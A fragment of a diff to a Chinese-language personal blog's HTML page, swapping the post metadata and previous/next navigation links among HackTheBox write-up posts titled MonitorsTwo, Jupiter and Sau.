-      <div>MonitorsTwo - HackTheBox</div>
-      <div>http://aurey7.github.io.git/2023/07/16/MonitorsTwo-HackTheBox/</div>
+      <div>Jupiter - HackTheBox</div>
+      <div>http://aurey7.github.io.git/2023/07/18/Jupiter-HackTheBox/</div>
     </div>
     <div class="license-meta">
       
@@ -405,7 +476,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年7月16日</div>
+          <div>2023年7月18日</div>
         </div>
       
       
@@ -437,18 +508,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/07/18/Jupiter-HackTheBox/" title="Jupiter - HackTheBox">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Jupiter - HackTheBox</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/07/15/Sau-HackTheBox/" title="Sau - HackTheBox">
-                        <span class="hidden-mobile">Sau - HackTheBox</span>
+                      <a href="/2023/07/16/MonitorsTwo-HackTheBox/" title="MonitorsTwo - HackTheBox">
+                        <span class="hidden-mobile">MonitorsTwo - HackTheBox</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
